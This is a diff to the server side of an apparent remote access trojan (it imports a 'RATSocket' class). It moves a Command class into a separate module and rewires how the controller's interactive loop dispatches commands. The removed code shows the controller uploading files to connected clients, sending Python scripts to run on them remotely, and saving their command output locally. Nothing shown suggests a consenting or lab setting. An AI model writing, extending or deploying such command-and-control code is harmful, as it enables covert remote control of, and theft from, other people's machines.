@@ -1,4 +1,3 @@
-import glob
 import inspect
 import json
 import re
@@ -11,8 +10,9 @@ import time
 from functools import partial
 
 from common.ratsocket import RATSocket
-from common.util import logger, parse, scan_args, format_dict, get_time
-from server.config.config import SOCKET_ADDR, ALIAS_PATH, SCRIPT_PATH
+from common.util import logger, parse
+from server.config.config import SOCKET_ADDR, ALIAS_PATH
+from server.util.command import Command
 from server.util.util import *
 from server.wrapper.client import Client
 
@@ -142,8 +142,8 @@ class Server:
         conn.status = True  # 设置连接为交互中
         while not conn.results.empty():  # 连接前判断有没有未读消息
             logger.info(conn.results.get()[1])
-        cmds = {name: getattr(Command, name) for name, func in vars(Command).items() if
-                callable(getattr(Command, name))}  # 服务端命令
+        executor = Command(conn, self)
+        cmds = [name for name, method in inspect.getmembers(executor, inspect.ismethod) if not name.startswith('__')]
         try:
             while 1:
                 try:
@@ -167,10 +167,7 @@ class Server:
                         break
                     # 服务端命令
                     elif name in cmds:
-                        func = partial(cmds[name], conn, arg)
-                        if not inspect.isgeneratorfunction(func):  # 如果不是生成器函数
-                            write(*func())
-                            continue
+                        func = partial(getattr(executor, name), arg)
                     # 别名
                     elif name in self.aliases:
                         func = partial(self.send_alias, conn, name, arg)
@@ -280,138 +277,6 @@ class Server:
         func = partial(conn.send_command, command)
         for i in func():
             yield i
-
-
-class Command:
-
-    @staticmethod
-    def upload(conn, arg):
-        """
-        上传文件
-        :param conn: 连接
-        :param arg: 文件名
-        """
-        if os.path.isfile(arg):
-            try:
-                for i in conn.send_file(arg):
-                    yield i
-            except:
-                conn.commands.clear()
-                raise
-        else:
-            raise FileNotFoundError('File does not exist')
-
-    @staticmethod
-    def exec(conn, arg):
-        """
-        发送python脚本
-        :param conn: 连接
-        :param arg: 文件名
-        :return: 状态，结果
-        """
-        # script_dir = 'server/script/'
-        # script_dir = 'server/script/'
-        # 显示脚本列表
-        scripts = []
-        if not arg:
-            for file in glob.iglob(os.path.join(SCRIPT_PATH, '**/*.py'), recursive=True):
-                scripts.append(os.path.relpath(file, SCRIPT_PATH).replace('\\', '/'))
-            yield 1, '\n'.join(scripts)
-            return
-        # 发送脚本
-        arg = shlex.split(arg)  # 拆分脚本名和参数
-        script_name = os.path.abspath(os.path.join(SCRIPT_PATH, arg[0]))  # 脚本名
-        if not os.path.isfile(script_name):
-            # 自动添加.py后缀
-            script_path_with_extension = f"{script_name}.py"
-            if os.path.isfile(script_path_with_extension):
-                script_name = script_path_with_extension
-            else:
-                raise FileNotFoundError(f'File does not exist: {script_name}')
-        with open(script_name, 'rt') as f:
-            try:
-                func = partial(conn.send_command, f.read(), type='script', extra=scan_args(arg[1:]))
-                for i in func():
-                    yield i
-
-            except UnicodeDecodeError:
-                raise RuntimeError(f'Unprocessable file: {script_name}')
-
-    @staticmethod
-    def history(conn, arg):
-        """
-        显示历史记录
-        :param conn: 连接
-        :param arg: -f 显示详细信息 -c 清除记录
-        :return: 状态，结果
-        """
-        if arg in ['-f', '--full']:
-            return 1, json.dumps(conn.history, ensure_ascii=False, indent=2)
-        elif arg in ['-c', '--clear']:
-            conn.history.clear()
-            return 1, 'History cleared'
-        else:
-            cmd_list = []
-            for cmd in conn.history.values():
-                cmd_list.append(cmd['command'])
-            return 1, '\n'.join(cmd_list)
-
-    @staticmethod
-    def save_result(conn, arg):
-        """
-        将命令结果写入本地文件
-        :param conn: 连接
-        :param arg: 命令
-        :return: 状态，结果
-        """
-        if not arg:
-            return 0, ''
-        func = partial(conn.send_command, arg)
-        filename = f'command_{conn.address[0]}_{get_time()}.txt'
-        with open(filename, 'wt') as f:
-            for i in func():
-                f.write(i[1] + '\n')
-        return 1, 'Result saved to {}'.format(filename)
-
-    @staticmethod
-    def alias(conn, arg):
-        # 显示别名列表
-        if not arg:
-            return 1, format_dict(server.aliases)
-        # 没有等号
-        equal_mark_index = arg.find('=')
-        if equal_mark_index == -1:
-            raise SyntaxError('missing equal mark')
-        # 拆分
-        alias = arg[0:equal_mark_index].strip()
-        cmd = arg[equal_mark_index + 1:].strip()
-        # 判断是否有空值
-        if not all([alias, cmd]):
-            raise SyntaxError('null value not accepted')
-        server.aliases[alias] = cmd
-        server.save_aliases()
-        return 1, f'Alias added: {alias} -> {cmd}'
-
-    @staticmethod
-    def unalias(conn, arg):
-        if not arg:
-            raise SyntaxError('missing alias name')
-        if arg not in server.aliases:
-            raise KeyError(f'alias does not exist: {arg}')
-        server.aliases.pop(arg)
-        server.save_aliases()
-        return 1, f'Alias removed: {arg}'
-
-
-def write(status: int, result: str):
-    """
-    在控制台输出结果
-    :param status: 0或者1
-    :param result: 结果
-    """
-    if not status:
-        result = Colors.BRIGHT_RED + result + Colors.RESET
-    print(result)
 
 
 if __name__ == '__main__':
